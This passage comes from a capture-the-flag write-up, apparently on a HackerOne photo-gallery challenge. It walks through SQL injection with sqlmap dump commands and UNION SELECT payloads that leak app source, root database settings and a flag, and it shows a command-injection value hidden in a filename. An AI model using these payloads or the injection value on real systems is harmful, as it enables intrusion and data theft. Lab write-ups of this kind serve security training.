</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">5</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Database</span><span>  </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">MySQL</span><span>        </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">&gt;=</span><span> </span><span class="token token" style="color:#4499ee">5.0</span><span class="token token" style="color:#4499ee">.12</span><span> </span><span class="token token" style="color:#999999">(</span><span class="token token maybe-class-name">MariaDB</span><span> fork</span><span class="token token" style="color:#999999">)</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c7526d">yes</span><span> </span><span class="token token" style="color:#999999">(</span><span>id param</span><span class="token token" style="color:#999999">)</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span></span></code></pre><p>Good, we got something, we know the server is vulnerable to multiple vulnerabilities such as a &#x27;boolean base blind&#x27;. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>sqlmap </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>u </span><span class="token token" style="color:#c9c0be;background:#000000">&quot;http://34.74.105.127/ad3e8c7df9/fetch?id=2&quot;</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>f </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>os</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>linux </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>dbms</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>mysql </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>level</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">3</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>o</span></span></code></pre><p>we dont really get any more useful information from here.
soo.. were kinda stuck lets just get another hint then:</p><blockquote><p>Hint 2: <em>Take a few minutes to consider the <strong>state of the union</strong></em></p></blockquote><p>The state uf the union? are they hinting on using UNION statements in the query?
<em>The UNION operator is used to combine the result-set of two or more SELECT statements.</em>
That seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:</p><p><code>http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT &#x27;something&#x27;</code></p><p>but what do we look for? Lets get another hint.</p><blockquote><p>Hint 3: <em>This application runs on the <strong>uwsgi-nginx-flask-docker</strong> image</em></p></blockquote><p>uwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.</p><p>https://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files</p><blockquote><p>uWSGI can be configured using several different methods.</p></blockquote><p>YAML, JSON, INI are some supported formats -&gt; ini beeing the defualt so lets try getting the &#x27;uwsgi.ini&#x27; file?</p><p><img src="/hackerone/union-select-ini.png" alt="union select wiht burp repeater" title="union select wiht burp repeater"/></p><p>this returns us some configdata pointing to module main which is the entrypoint.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#999999">[</span><span>uwsgi</span><span class="token token" style="color:#999999">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>module </span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span> main
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span></span><span class="token token" style="color:#f07693">callable</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span> app</span></span></code></pre><p>so lets see if we can also fethc the main.py</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>http</span><span class="token token" style="color:#999999">:</span><span class="token token" style="color:#c9c0be;background:#000000">//</span><span class="token token" style="color:#4499ee">35.190</span><span class="token token" style="color:#4499ee">.155</span><span class="token token" style="color:#4499ee">.168</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>c947e97f6e</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch?</span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">4</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>20UNION</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>20SELECT</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span class="token token" style="color:#4499ee">20</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>27main</span><span class="token token" style="color:#999999">.</span><span>py</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span class="token token" style="color:#4499ee">27</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span></span></code></pre><p>Here we get lots of infos our <strong>first FLAG</strong> and the db connection settings:</p><h3>FLAG 0:</h3><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>s
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; % (pid, sanitize(ptitle)) fns.append(pfn) rep += &#x27;</span><span>Space used</span><span class="token token" style="color:#999999">:</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; + subprocess.check_output(&#x27;</span><span>du </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>ch </span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>s </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> exit </span><span class="token token" style="color:#4499ee">0</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; % &#x27;</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">&#x27;.join(&#x27;</span><span>files</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit(&#x27;</span><span>\n</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27;, 1)[-1] + &#x27;</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; rep += &#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span>\n</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; return home.replace(&#x27;</span><span>$ALBUMS$</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27;, rep) @app.route(&#x27;</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27;) def fetch(): cur = getDb().cursor() if cur.execute(&#x27;</span><span>SELECT filename FROM photos WHERE </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>s</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; % request.args[&#x27;</span><span class="token token" style="color:#f07693">id</span><span>&#x27;</span><span class="token token" style="color:#999999">]</span><span class="token token" style="color:#999999">)</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">==</span><span> </span><span class="token token" style="color:#4499ee">0</span><span class="token token" style="color:#999999">:</span><span> abort</span><span class="token token" style="color:#999999">(</span><span class="token token" style="color:#4499ee">404</span><span class="token token" style="color:#999999">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span></span><span class="token token" style="color:#4e5c63"># It&#x27;s dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file(&#x27;./%s&#x27; % cur.fetchone()[0].replace(&#x27;..&#x27;, &#x27;&#x27;), &#x27;rb&#x27;).read() if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;, port=80)</span></span></code></pre><p><code>return MySQLdb.connect(host=&quot;localhost&quot;, user=&quot;root&quot;, password=&quot;&quot;, db=&quot;level5&quot;)</code></p><p>we also see that they are using the photos table</p><p><code>cur.execute(&#x27;SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3&#x27;, (id, ))</code></p><p>lets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>sqlmap </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>u </span><span class="token token" style="color:#c9c0be;background:#000000">&quot;http://34.74.105.127/ad3e8c7df9/fetch?id=1&quot;</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>method</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>dump </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>D level5 </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>T photos </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>p </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#999999">,</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>code</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">200</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>ignore</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>code</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">500</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>skip</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>waf </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>o </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>threads </span><span class="token token" style="color:#4499ee">2</span></span></code></pre><p>This can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column <code>filename</code> since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>sqlmap </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>u </span><span class="token token" style="color:#c9c0be;background:#000000">&quot;http://35.190.155.168/c947e97f6e/fetch?id=3&quot;</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>method</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>dump </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>D level5 </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>T photos </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>p </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#999999">,</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>code</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">200</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>ignore</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>code</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">500</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>skip</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>waf </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>o </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>threads </span><span class="token token" style="color:#4499ee">4</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>C filename</span></span></code></pre><p>This means that sqlmap will start with the filename of id=3 which is exactly what we want right now.</p><p><img src="/hackerone/photo-gallery-hash.png" alt="starts to query filename of id 3" title="query on the filename of id 3"/>
So lets have a look at our results:</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>Database</span><span class="token token" style="color:#999999">:</span><span> level5
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>Table</span><span class="token token" style="color:#999999">:</span><span> photos
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span></span><span class="token token" style="color:#999999">[</span><span class="token token" style="color:#4499ee">3</span><span> entries</span><span class="token token" style="color:#999999">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">5</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> filename </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">6</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">7</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">8</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> files</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>adorable</span><span class="token token" style="color:#999999">.</span><span>jpg </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">9</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> files</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>purrfect</span><span class="token token" style="color:#999999">.</span><span>jpg </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">10</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">+</span></span></code></pre><blockquote><p>you might be getting partial values like so:
<code>9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????</code>
you should be able to re-run sqlmap to find the missing characters
<code>9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa</code></p></blockquote><p>decrypted: <code>\*||+ls+-a+tmp.txt</code>
another file! nice lets try and get that with a UNION STATEMENT request like so:</p><p><code>GET /ad3e8c7df9/fetch?id=4 UNION SELECT &#x27;tmp.txt&#x27;-- HTTP/1.1</code>
